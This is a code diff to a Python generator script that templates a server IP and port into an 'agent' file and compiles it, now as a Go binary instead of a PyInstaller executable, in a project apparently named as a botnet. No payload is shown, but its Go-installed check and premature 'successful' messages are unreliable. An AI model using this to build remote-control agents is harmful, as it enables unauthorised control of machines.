@@ -1,10 +1,12 @@
 from string import Template
 from colorama import Fore,Style
-import PyInstaller.__main__
-import argparse
 import sys 
-import subprocess
+import os
 import time
+import argparse
+import platform
+import subprocess 
+import PyInstaller.__main__
 
 """
 Name: generator.py 
@@ -71,12 +73,31 @@ def generate(template, newfile, serverip, port):
     try:
         with open(newfile, 'w') as fd:
             fd.write(new)
-        print_green("[+] Generating agent_deploy.py successful.")
+        print_green("[+] Generating agent.go successful.")
 
     except Exception as e:
         print_red("[-] " + str(e))
 
 def freeze():
+    cmd = "where" if platform.system() == "Windows" else "which"
+    try:
+        subprocess.call([cmd, "go"])
+    except:
+        print_red("[-] Golang is not installed in this machine. Please install golang.")
+        exit()
+
+    print_green("[+] Golang is installed.")
+    print_green("[+] Using go agent to freeze and create static executable...")
+    try:
+        subprocess.Popen('go build /opt/yabnet/agent/agent.go', stderr=subprocess.PIPE, shell=True)
+        print_green("[+] Freezing was successful. Check /opt/yabnet/agent/agent")
+    except Exception as e:
+        print_red("[-] " + str(e))
+        exit()
+    
+
+
+def freeze_python():
     try: 
         print_green("[+] Using PyInstaller to Freeze agent_deploy. This will take some time...")
         pyinstaller = subprocess.Popen('cd /opt/yabnet/agent;pyinstaller -F "/opt/yabnet/agent/agent_deploy.py"', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
@@ -103,7 +124,7 @@ def freeze():
 def main():
     # HARDCODING FTW (shouldn't do this) 
     TEMPLATE = '/opt/yabnet/agent/agent.txt'
-    NEWFILE = '/opt/yabnet/agent/agent_deploy.py'
+    NEWFILE = '/opt/yabnet/agent/agent.go'
 
     # Parse the arguments 
     arguments = parse()
